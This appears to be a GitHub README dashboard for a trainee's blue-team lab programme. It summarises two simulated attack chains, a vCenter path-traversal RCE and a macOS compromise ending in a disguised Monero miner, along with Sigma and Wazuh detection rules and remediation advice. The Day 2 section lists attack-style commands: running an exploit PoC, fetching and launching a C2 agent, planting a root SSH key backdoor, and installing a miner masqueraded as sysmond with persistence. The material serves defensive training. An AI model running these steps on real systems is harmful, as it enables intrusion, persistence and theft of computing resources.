<div align="center">

# 🛡️ GraySentinel Cyber Defence Lab
## DSOU Programme — Blue Team Operations Dashboard

![Programme](https://img.shields.io/badge/Programme-DSOU%20Blue%20Team-0A1F44?style=for-the-badge&logo=shield&logoColor=C9A227)
![Operator](https://img.shields.io/badge/Operator-GS--STU--DSOU--2026--039A-C9A227?style=for-the-badge)
![Days](https://img.shields.io/badge/Days%20Completed-2%20of%20?-success?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Active%20Trainee-brightgreen?style=for-the-badge)

</div>

---

## 👤 Analyst Identity

| Field | Detail |
|---|---|
| **Name** | Eswar Mahalingam |
| **Operator ID** | `GS-STU-DSOU-2026-039A` |
| **Title** | Blue Team Operator & Trainee |
| **Rank** | Officer Candidate |
| **Programme** | DSOU — GraySentinel Cyber Defence Lab |
| **Reports To** | Ritik Shrivas |
| **ID Issued** | 09 September 2026 |
| **ID Expires** | 08 March 2027 |
| **Contact** | eswarmba05313@gmail.com · +91-9360548243 |
| **Location** | Ghaziabad, Uttar Pradesh, India · Remote |

---

## 📊 Programme Statistics Dashboard

<div align="center">

| 🗓️ Days Done | 🔬 Phases Run | 🔴 CVEs Analysed | ⚠️ Risks Found | 🎯 Sigma Tripwires | 🔧 Wazuh Rules | 🗺️ ATT&CK Techniques |
|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
| **2** | **12** | **2** | **170+** | **9** | **7** | **8** |

</div>

### Severity Breakdown (Day 2)

| 🔴 Critical | 🟠 High | 🟡 Medium | 📋 Total Logged |
|:---:|:---:|:---:|:---:|
| **4** | **6** | **3** | **170+** |

---

## 🗂️ Repository Map

```
GraySentinel-DSOU/
│
├── 📁 Day1-ZeroDay-Discovery/               ← CVE-2026-59310 · vCenter RCE
│   ├── 📁 detection/
│   │   └── detection-rule.sigma             (3 tripwires · ATT&CK T1053.003)
│   ├── 📁 report/
│   │   ├── report.md
│   │   └── GraySentinel_DSOU_Day1_Report.pdf
│   ├── 📁 mission-log/
│   │   └── mission-log.md
│   ├── 📁 certificate/
│   │   └── Day1_Certificate.png
│   ├── PUSH_TO_GITHUB.md
│   └── README.md
│
├── 📁 Day2-MacOSMiner-Attack-Chain/         ← CVE-2026-65400 · macOS RCE
│   ├── 📁 detection/
│   │   ├── detection-rule.sigma             (6 tripwires · ATT&CK mapped)
│   │   └── detection-rule-wazuh.xml         (7 rules · IDs 100200–100206)
│   ├── 📁 report/
│   │   ├── report.md
│   │   └── GraySentinel_DSOU_Day2_Report.pdf
│   ├── 📁 mission-log/
│   │   └── mission-log.md
│   ├── PUSH_TO_GITHUB.md
│   └── README.md
│
└── README.md                                ← THIS FILE (Master Dashboard)
```

---

## 🔴 DAY 1 — Zero-Day Discovery

> **CVE-2026-59310** · vCenter rsyslog Path Traversal → Remote Code Execution · Lab Environment

### Mission Brief
| Field | Detail |
|---|---|
| **Date** | 09 September 2026 |
| **Environment** | GrayOS — Kali Terminal |
| **Target** | vCenter Server (lab) |
| **Core CVE** | CVE-2026-59310 (vCenter rsyslog path-traversal-to-RCE) |
| **Phases** | 6 of 6 ✅ |
| **Certificate** | Earned ✅ |

### Day 1 Attack Chain

```
┌─────────────────────────────────────────────────────────────────┐
│                  DAY 1 — ZERO-DAY DISCOVERY                     │
│                  CVE-2026-59310 vCenter RCE                     │
└─────────────────────────────────────────────────────────────────┘

Phase 1 → PATH TRAVERSAL DISCOVERY
         Identify rsyslog path-traversal flaw in vCenter
         Tool: manual HTTP fuzzing + directory traversal

Phase 2 → VULNERABILITY CONFIRMATION
         Confirm arbitrary file read outside webroot
         Tripwire: traversal pattern → /etc/passwd read

Phase 3 → CRON JOB WRITE (Privilege Escalation)
         Exploit write-permission to drop malicious cron job
         Tripwire: cron-write · ATT&CK T1053.003

Phase 4 → RSYSLOG CHILD SHELL
         Trigger rsyslog to spawn reverse shell as root
         Tripwire: rsyslog-child-shell

Phase 5 → POST-EXPLOITATION ENUMERATION
         Map internal network, enumerate services

Phase 6 → DETECTION & REMEDIATION
         Patch path, remove cron, deploy Sigma rule
         Artifact: detection-rule.sigma (3 tripwires, FP-tuned)
```

### Day 1 Sigma Rule Summary

| Tripwire | Pattern | ATT&CK |
|---|---|---|
| Path Traversal | `../` sequences in rsyslog log path | T1083 |
| Cron Write | New cron job created via log injection | T1053.003 |
| rsyslog Child Shell | Unexpected shell spawned as rsyslog child | T1059 |

**FP Controls:** Tuned to exclude legitimate admin cron activity and authorised log rotation.

### Day 1 Artifacts

| File | Description | Status |
|---|---|---|
| `detection/detection-rule.sigma` | 3-tripwire Sigma rule (FP-tuned) | ✅ |
| `report/report.md` | Full phase-by-phase incident report | ✅ |
| `report/GraySentinel_DSOU_Day1_Report.pdf` | Navy/gold 2-page PDF report | ✅ |
| `mission-log/mission-log.md` | Mission timeline & observations | ✅ |
| `certificate/Day1_Certificate.png` | GraySentinel Day 1 completion certificate | ✅ |

---

## 🟠 DAY 2 — macOS Miner Attack Chain

> **CVE-2026-65400** · macOS Screen Sharing Pre-Auth RCE · CVSS 9.8 Critical · Lab Environment

### Mission Brief

| Field | Detail |
|---|---|
| **Date** | 10 September 2026 |
| **Environment** | GrayOS — Kali Terminal (forensic@macos) |
| **Target** | macOS Host 192.168.1.50 (lab) |
| **Core CVE** | CVE-2026-65400 (macOS Screen Sharing SRP frame-length bypass → pre-auth RCE) |
| **CVSS Score** | 9.8 — CRITICAL |
| **Phases** | 6 of 6 ✅ |
| **Total Risks** | 170 identified |

### Day 2 Attack Chain

```
┌─────────────────────────────────────────────────────────────────┐
│              DAY 2 — macOS MINER ATTACK CHAIN                   │
│              CVE-2026-65400 · 170 Risks Identified              │
└─────────────────────────────────────────────────────────────────┘

Phase 1 → PHISHING EMAIL ANALYSIS (oletools)
         pip install oletools
         olevba suspicious_document.doc    → AutoExec + URLDownloadToFile
         oleid suspicious_document.doc     → C2 domain in OLE structure
         ↳ Risks #2 (High), #3 (High), #4 (Medium)

Phase 2 → CVE-2026-65400 EXPLOITATION
         python3 poc_screensharing.py 192.168.1.50
         python3 poc_screensharing.py 192.168.1.50 /etc/passwd
         ↳ SRP frame-length bypass → Pre-auth RCE as root
         ↳ Risks #1 (Critical), #12 (Medium)

Phase 3 → AdaptixC2 + SSH BACKDOOR
         curl AdaptixC2.tar.gz | tar xz
         ./agent.macos --server 192.168.1.100 --port 443
         ssh-keygen -t rsa && >> authorized_keys
         ↳ Go C2: shell/screenshot/upload/download
         ↳ Root SSH backdoor independent of C2
         ↳ Risks #10 (Critical), #7 (Critical)

Phase 4 → XMRig MONERO MINER DEPLOYMENT
         curl xmrig-6.26.0-linux-static-x64.tar.gz | tar xz
         cp xmrig → /private/var/root/.config/sysmond   ← MASQUERADE
         cat > /Library/LaunchDaemons/com.xmr.miner.plist  ← KEEPALIVE
         ps aux | grep -E "xmrig|sysmond"
         ↳ 98%+ CPU · Monero mining · KeepAlive restart
         ↳ Risks #8 (High), #6 (High), #9 (Medium)

Phase 5 → OSINT ATTRIBUTION (Tookie-OSINT)
         git clone tookie-osint
         python3 tookie-osint -u attacker
         dig attacker-domain.com MX
         ↳ Social media attribution + mail infrastructure mapped
         ↳ Risk #4 (Medium)

Phase 6 → DETECTION & REMEDIATION
         killall sysmond xmrig
         rm -rf /Library/LaunchDaemons/com.xmr.miner.plist
         rm -rf /private/var/root/.config/sysmond
         cat > detection-rule-wazuh.xml
         echo "Detection rules deployed. Attack chain analysed."
         ↳ Risks #5 (High), #11 (High) addressed
```

### Day 2 — Top 12 Vulnerabilities

| # | Vulnerability | Severity | CVSS / Notes |
|---|---|---|---|
| 1 | **CVE-2026-65400 — Screen Sharing RCE** | 🔴 Critical | CVSS 9.8 — Pre-auth SRP bypass → root |
| 2 | VBA Download Cradle | 🟠 High | URLDownloadToFile, no consent |
| 3 | No Macro Security Controls | 🟠 High | AutoExec on document open |
| 4 | Suspicious External Relationships | 🟡 Medium | C2 domain embedded in OLE |
| 5 | LaunchAgents Persistence | 🟠 High | ~/Library/LaunchAgents/update.sh |
| 6 | LaunchDaemon KeepAlive Abuse | 🟠 High | com.xmr.miner.plist KeepAlive=true |
| 7 | **Root SSH Key Backdoor** | 🔴 Critical | /root/.ssh/authorized_keys |
| 8 | XMRig Masquerading as sysmond | 🟠 High | /private/var/root/.config/sysmond |
| 9 | No CPU/Resource Usage Alerting | 🟡 Medium | 98%+ CPU, no alert triggered |
| 10 | **AdaptixC2 Post-Exploitation** | 🔴 Critical | Go C2 — full system compromise |
| 11 | No Application Whitelisting | 🟠 High | Unsigned binaries run freely |
| 12 | Screen Sharing Port 5900 Exposed | 🟡 Medium | Required for CVE-2026-65400 |

> 📋 Full vulnerability report: **170 risks** across all categories (see Vulnerability Report window in GrayOS)

### Day 2 — Detection Engineering

#### Sigma Rule (6 Tripwires)

| Tripwire | Detection Target | ATT&CK |
|---|---|---|
| `macro_cradle` | olevba / oleid / URLDownloadToFile execution | T1566, T1059 |
| `screen_sharing_exploit` | poc_screensharing.py + port 5900 | T1203 |
| `xmrig_masquerade` | Binary named sysmond running with xmrig args | T1496 |
| `launch_daemon_miner` | New plist in /Library/LaunchDaemons/ matching miner/com.xmr | T1543.004 |
| `ssh_backdoor` | Root ssh-keygen + authorized_keys write | T1098 |
| `adaptixc2_agent` | agent.macos --server --port 443 execution | T1071 |

#### Wazuh SIEM Rules

| Rule ID | Level | Description |
|---|---|---|
| 100200 | 12 | Phishing document analysis — oletools execution |
| 100201 | 15 | **CRITICAL** — CVE-2026-65400 PoC executed |
| 100202 | 15 | **CRITICAL** — XMRig as sysmond detected |
| 100203 | 13 | LaunchDaemon miner plist created |
| 100204 | 15 | **CRITICAL** — Root SSH authorized_keys modified |
| 100205 | 15 | **CRITICAL** — AdaptixC2 agent launched |
| 100206 | 10 | sysmond >90% CPU — miner suspected |

### Day 2 Tools Used

| Tool | Version | Purpose |
|---|---|---|
| `oletools` (olevba, oleid) | Latest | VBA macro / phishing document analysis |
| `poc_screensharing.py` | Lab | CVE-2026-65400 Screen Sharing exploit PoC |
| `AdaptixC2` | Latest | Go-based C2 post-exploitation framework |
| `XMRig` | 6.26.0 | Monero cryptocurrency miner |
| `Tookie-OSINT` | Latest | Social media threat actor attribution |
| `dig` | System | DNS MX infrastructure mapping |
| `Wazuh SIEM` | — | Detection rule deployment |
| `Sigma` | — | Portable detection rule format |

### Day 2 Artifacts

| File | Description | Status |
|---|---|---|
| `detection/detection-rule.sigma` | 6-tripwire Sigma rule (ATT&CK mapped) | ✅ |
| `detection/detection-rule-wazuh.xml` | 7 Wazuh SIEM rules (IDs 100200–100206) | ✅ |
| `report/report.md` | Full phase-by-phase incident report | ✅ |
| `report/GraySentinel_DSOU_Day2_Report.pdf` | Navy/gold 2-page PDF report | ✅ |
| `mission-log/mission-log.md` | Mission timeline & analyst observations | ✅ |

---

## 🗺️ Combined MITRE ATT&CK Coverage

| Tactic | Technique ID | Technique Name | Day |
|---|---|---|---|
| Initial Access | T1566 | Phishing | Day 2 |
| Execution | T1203 | Exploit Public-Facing Application | Day 2 |
| Execution | T1059 | Command & Scripting Interpreter | Day 1, Day 2 |
| Persistence | T1053.003 | Scheduled Task/Job — Cron | Day 1 |
| Persistence | T1543.004 | Create/Modify System Process — Launch Daemon | Day 2 |
| Persistence | T1098 | Account Manipulation (SSH key) | Day 2 |
| Command & Control | T1071 | Application Layer Protocol | Day 2 |
| Impact | T1496 | Resource Hijacking (Monero mining) | Day 2 |
| Discovery | T1083 | File and Directory Discovery | Day 1 |
| Reconnaissance | T1591 | Gather Victim Network Information | Day 2 |

**Total: 10 ATT&CK techniques mapped across 2 days**

---

## 🧰 Skills & Tools Matrix

| Category | Tools Demonstrated |
|---|---|
| **Forensic Analysis** | oletools (olevba, oleid), dig, ps aux, Tookie-OSINT |
| **Vulnerability Research** | CVE analysis, CVSS scoring, PoC execution (lab) |
| **Detection Engineering** | Sigma rules, Wazuh XML rules, ATT&CK mapping |
| **Incident Response** | Contain → Eradicate → Recover cycle (both days) |
| **OSINT** | Tookie-OSINT, DNS MX enumeration, domain attribution |
| **Report Writing** | Navy/gold PDF reports, Markdown incident docs |
| **Lab Environment** | GrayOS, Kali Linux, forensic@macos terminal |

---

## 📈 Progress Tracker

| Day | Mission | CVE | Phases | Risks | Sigma | Wazuh | Cert | Status |
|---|---|---|---|---|---|---|---|---|
| **Day 1** | Zero-Day Discovery | CVE-2026-59310 | 6/6 | — | 3 tripwires | — | ✅ | Complete |
| **Day 2** | macOS Miner Attack Chain | CVE-2026-65400 (CVSS 9.8) | 6/6 | 170 | 6 tripwires | 7 rules | ⏳ | Complete |
| **Day 3** | — | — | — | — | — | — | — | Upcoming |

---

## 🔵 Blue Team Recommendations (Combined)

### Immediate Actions
- Patch **CVE-2026-65400** — apply Apple Security Update; disable Screen Sharing; firewall port 5900
- Patch **CVE-2026-59310** — fix rsyslog path traversal in vCenter; restrict write permissions
- Rotate all SSH keys; audit `/root/.ssh/authorized_keys` on all macOS endpoints
- Block `attacker-domain.com` and `192.168.1.100` at DNS/firewall perimeter
- Kill and remove any `sysmond` binary not matching Apple's baseline SHA-256

### Detection Controls
- Deploy `detection-rule.sigma` to any SIEM supporting Sigma (Wazuh, Splunk, Elastic)
- Deploy `detection-rule-wazuh.xml` directly to Wazuh manager
- Enable macro blocking in Microsoft Office; enforce document signing
- Configure CPU usage alerting: >80% sustained CPU triggers alert
- Monitor `/Library/LaunchDaemons/` for new plist files

### Strategic Hardening
- Implement application whitelisting (Gatekeeper + MDM)
- Enforce SRP/TLS mutual authentication on all remote-access services
- Deploy EDR with behavioural detection (process masquerade, LaunchDaemon abuse)
- Conduct SOC tabletop exercise simulating full macOS miner chain

---

## ⚖️ Analyst Declaration

> All work performed inside the **GraySentinel GrayOS sandbox environment**.  
> No real systems were targeted at any point.  
> All artifacts (Sigma rules, Wazuh rules, reports) are **defensive and educational**.  
> Exploit code is intentionally **not reproduced** — only detection and remediation artifacts are committed.  
> This repository follows the **defensive-artifacts-only** standard established in Day 1.

---

<div align="center">

**Eswar Mahalingam**  
Blue Team Operator & Trainee · `GS-STU-DSOU-2026-039A`  
GraySentinel Cyber Defence Lab · DSOU Programme  
Ghaziabad, UP, India · eswarmba05313@gmail.com

![Blue Team](https://img.shields.io/badge/Blue%20Team-Defender-0A1F44?style=flat-square&logo=shield)
![SOC](https://img.shields.io/badge/SOC-Analyst%20in%20Training-C9A227?style=flat-square)
![ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-10%20Techniques-red?style=flat-square)
![Sigma](https://img.shields.io/badge/Sigma-9%20Tripwires-blue?style=flat-square)

</div>
